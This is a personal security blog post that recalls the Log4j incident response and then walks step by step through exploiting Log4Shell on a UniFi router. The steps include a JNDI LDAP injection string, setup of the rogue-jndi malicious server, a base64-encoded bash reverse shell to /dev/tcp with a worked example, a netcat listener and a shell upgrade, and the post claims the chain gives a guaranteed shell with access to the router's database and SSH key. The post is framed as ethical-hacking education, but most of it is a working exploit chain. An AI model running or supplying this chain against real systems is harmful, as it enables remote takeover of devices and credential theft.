+++
title = 'Understanding Log4j through Exploitation'
date = 2025-01-22T14:59:57-07:00
draft = false
tags = ["Log4j", "Ethical Hacking"]
categories = ["Penetration Testing"]
+++
# Log4j

It was December 9, 2021. I was working as a Vulnerability Management Consultant working for X-Force Red. Suddenly, it was all hands on deck. A new vulnerability had hit the scene and it was EXPLOSIVE. Log4j was a little logging library that java used and it was in EVERYTHING. All of our clients had it and they were worried. We spent weeks working with each of our POC's (Point of Contact) and helping them identify their vulnerable machines.

It was a nightmare.

A few years on though, I thought it might be fun to learn how to run the exploit myself. I found this writeup from Spocket and tested it with a Unify router and can confirm that this attack works. It's a guaranteed shell on the device, and as they pointed out, a great way of accessing the router's database and subsequent ssh key.

The excellent writeup can be found [here](https:/www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi). 

# Steps of Exploitation:

Step 1: Identify an injectable field. For instance, the unifi router has one in the remember field of the login page.

Step 2: inject the following string into the field "${jndi:ldap://{Tun0 IP Address}/whatever}"

Step 3: run the following command on your machine to confirm the app is reaching out: `sudo tcpdump -i {interface} port 389`

Step 4: Make sure you have openjdk and maven installed for exploit kit.
```
sudo apt update
sudo apt install openjdk-11-jdk -y
sudo apt install maven
```

Step 5. Install the rogue-jndi toolkit:
```
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```
Step 6. Craft a payload for the malicious server:
```
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64
```

Step 7. Launch the malicious server. PRO TIP, REMOVE ANY SPACES IN THE CURLY BRACES OR IT WILL NOT WORK.
```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```
For Example:
```
java -jar target/RogueJndi-1.1.jar --command "bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.33"
```

Step 8. Setup a netcat listener to catch the shell:
nc -lvpn 4444

Step 9: Set the payload in the app to call to your malicious server's ldap resource:
```
${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
```

Step 10: Enjoy your new shell by upgrading it:
script /dev/null -c bash
